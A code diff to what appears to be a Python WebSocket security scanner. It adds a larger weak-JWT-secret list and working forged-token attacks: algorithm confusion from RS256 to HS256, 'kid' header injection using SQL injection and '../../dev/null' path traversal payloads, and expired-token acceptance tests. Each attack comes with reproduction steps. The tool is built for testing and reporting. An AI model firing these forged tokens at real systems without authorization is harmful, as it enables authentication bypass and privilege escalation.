@@ -51,10 +51,22 @@ def craft_jwt(header, payload, secret='', alg='HS256'):
     return f"{signing}."
 
 WEAK_SECRETS = [
-    'secret','password','123456','qwerty','admin','jwt_secret',
-    'your-256-bit-secret','mysecret','supersecret','secret123',
-    'key','changeme','default','test','dev','jwt','token',
-    'hello','world','1234','master','root','pass123','admin123',
+    # Common passwords
+    'secret', 'password', '123456', 'qwerty', 'admin', 'jwt_secret',
+    'your-256-bit-secret', 'mysecret', 'supersecret', 'secret123',
+    'key', 'changeme', 'default', 'test', 'dev', 'jwt', 'token',
+    'hello', 'world', '1234', 'master', 'root', 'pass123', 'admin123',
+
+    # New additions — common in real apps
+    'secretkey', 'jwtkey', 'jwt-secret', 'app_secret', 'app-secret',
+    'mysecretkey', 'privatekey', 'private_key', 'signing_key',
+    'access_token_secret', 'refresh_token_secret', 'auth_secret',
+    'flask_secret', 'django_secret', 'rails_secret', 'node_secret',
+    '12345678', '123456789', '1234567890', 'password123', 'admin1234',
+    'letmein', 'welcome', 'monkey', 'dragon', 'master123',
+    'secret_key_here', 'your_secret_key', 'change_me_please',
+    'production_secret', 'staging_secret', 'development_secret',
+    '', 'null', 'undefined', 'none', 'test123', 'guest',
 ]
 
 AUTH_SUCCESS_SIGNALS = [
@@ -273,7 +285,129 @@ async def test_cswsh(ws_url: str) -> bool:
     return False
 
 
-async def test_jwt_attacks(ws_url: str) -> list:
+# ── JWT Algorithm Confusion (RS256 → HS256) ───────────────────────────────
+async def _test_alg_confusion(ws_url: str, header: dict, payload: dict) -> bool:
+    """
+    Algorithm Confusion Attack:
+    If server uses RS256 (asymmetric), try signing with HS256 using the
+    PUBLIC key as the HMAC secret — some servers accept this.
+    """
+    if not header or header.get('alg') != 'RS256':
+        return False
+
+    test_secrets = [
+        'public_key', 'rsa_public', '-----BEGIN PUBLIC KEY-----',
+        'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A',  # Common RSA header
+    ]
+
+    for secret in test_secrets:
+        crafted = craft_jwt({'alg': 'HS256', 'typ': 'JWT'}, payload, secret=secret, alg='HS256')
+        ok, resp = await _try_token(ws_url, crafted, 'alg_confusion_RS256_to_HS256')
+        if ok:
+            ev = Evidence.make(
+                payload=f"Changed alg from RS256 to HS256, signed with: '{secret}'",
+                response=resp[:200],
+                proof="Algorithm confusion attack: RS256 token accepted when re-signed as HS256",
+                reproduce=(
+                    f"1. Original JWT uses RS256\n"
+                    f"2. Change header alg to HS256\n"
+                    f"3. Sign with public key material as HMAC secret\n"
+                    f"4. Server accepts the forged token"
+                )
+            )
+            store.add(ws_url, 'JWT Algorithm Confusion (RS256\u2192HS256)', 'CRITICAL',
+                "Server vulnerable to algorithm confusion attack.\n"
+                "RS256 token accepted when re-signed as HS256.\n"
+                "Attacker can forge any JWT claims.", ev)
+            return True
+    return False
+
+
+# ── JWT KID (Key ID) Injection ──────────────────────────────────────────
+async def _test_kid_injection(ws_url: str, header: dict, payload: dict) -> bool:
+    """
+    KID Injection Attack:
+    The 'kid' header parameter specifies which key to use.
+    If server uses kid in SQL/file lookup without sanitization:
+      - SQL: kid = "' UNION SELECT 'hacked'--" → secret becomes 'hacked'
+      - Path: kid = "../../dev/null" → empty secret
+    """
+    kid_payloads = [
+        ("' UNION SELECT 'pwned'--",    'hacked', "SQL injection in kid"),
+        ("'; SELECT 'pwned'--",         'hacked', "SQL kid injection v2"),
+        ("0 UNION SELECT 'pwned'",      'hacked', "Numeric SQL kid injection"),
+        ("../../dev/null",              '',       "Path traversal kid \u2192 empty secret"),
+        ("../../../dev/null",           '',       "Path traversal kid v2"),
+        ("/dev/null",                   '',       "Absolute path kid"),
+    ]
+
+    for kid_val, secret, label in kid_payloads:
+        modified_header = {**(header or {'alg': 'HS256', 'typ': 'JWT'}), 'kid': kid_val}
+        crafted = craft_jwt(modified_header, payload or {'user': 'admin', 'role': 'admin'},
+                           secret=secret, alg='HS256')
+        ok, resp = await _try_token(ws_url, crafted, f'kid_injection_{label}')
+        if ok:
+            ev = Evidence.make(
+                payload=f"kid: {kid_val}",
+                response=resp[:200],
+                proof=f"KID injection confirmed: {label}. Server used attacker-controlled key.",
+                reproduce=(
+                    f"1. Craft JWT with kid header: '{kid_val}'\n"
+                    f"2. Sign token with secret: '{secret or '(empty)'}\'"
+                    f"\n3. Send to {ws_url}\n"
+                    f"4. Server accepts token \u2014 KID injection confirmed"
+                )
+            )
+            store.add(ws_url, 'JWT KID Injection', 'CRITICAL',
+                f"JWT Key ID (kid) injection confirmed.\n"
+                f"Attack: {label}\n"
+                f"KID value used: {kid_val}\n"
+                f"Attacker controls which key the server uses to verify token.", ev)
+            return True
+    return False
+
+
+# ── JWT Expiry Validation Check ─────────────────────────────────────────
+async def _test_expired_token(ws_url: str, header: dict, payload: dict) -> bool:
+    """
+    Test if server validates token expiry (exp claim).
+    Create a token expired 1 year ago — if server accepts = vulnerability.
+    """
+    expired_payload = {
+        **(payload or {}),
+        'iat': int(time.time()) - 86400 * 365,
+        'exp': int(time.time()) - 86400 * 365,
+        'nbf': int(time.time()) - 86400 * 365,
+    }
+
+    for secret in WEAK_SECRETS[:10]:
+        crafted = craft_jwt(
+            header or {'alg': 'HS256', 'typ': 'JWT'},
+            expired_payload,
+            secret=secret,
+            alg='HS256'
+        )
+        ok, resp = await _try_token(ws_url, crafted, 'expired_token')
+        if ok:
+            ev = Evidence.make(
+                payload=f"Token expired 365 days ago (exp: {expired_payload['exp']})",
+                response=resp[:200],
+                proof="Server accepted JWT with exp claim 1 year in the past \u2014 no expiry validation",
+                reproduce=(
+                    f"1. Create JWT with exp = current_time - 1_year\n"
+                    f"2. Sign with any valid secret\n"
+                    f"3. Server accepts expired token"
+                )
+            )
+            store.add(ws_url, 'JWT Expired Token Accepted', 'HIGH',
+                "Server does not validate JWT expiry (exp claim).\n"
+                "Tokens remain valid indefinitely after expiry.\n"
+                "Stolen tokens can be used forever.", ev)
+            return True
+    return False
+
+
+async def test_jwt_attacks(ws_url: str, fast_mode: bool = False) -> list:
     """JWT attack suite — only report confirmed bypasses"""
     results = []
 
@@ -377,6 +511,24 @@ async def test_jwt_attacks(ws_url: str) -> list:
                 f"Server accepted modified JWT claims without verifying signature.\n"
                 f"Attacker can set role=admin.", ev)
             results.append('jwt_privesc')
+
+    # ── Attack 4: Algorithm Confusion ──────────────────────────────
+    if generic_header and generic_header.get('alg') == 'RS256':
+        alg_found = await _test_alg_confusion(ws_url, generic_header, generic_payload)
+        if alg_found:
+            results.append('jwt_alg_confusion')
+
+    # ── Attack 5: KID Injection ───────────────────────────────────
+    if generic_header:
+        kid_found = await _test_kid_injection(ws_url, generic_header, generic_payload)
+        if kid_found:
+            results.append('jwt_kid_injection')
+
+    # ── Attack 6: Expired Token ───────────────────────────────────
+    if not fast_mode and generic_payload:
+        exp_found = await _test_expired_token(ws_url, generic_header, generic_payload)
+        if exp_found:
+            results.append('jwt_expired')
 
     return results
 
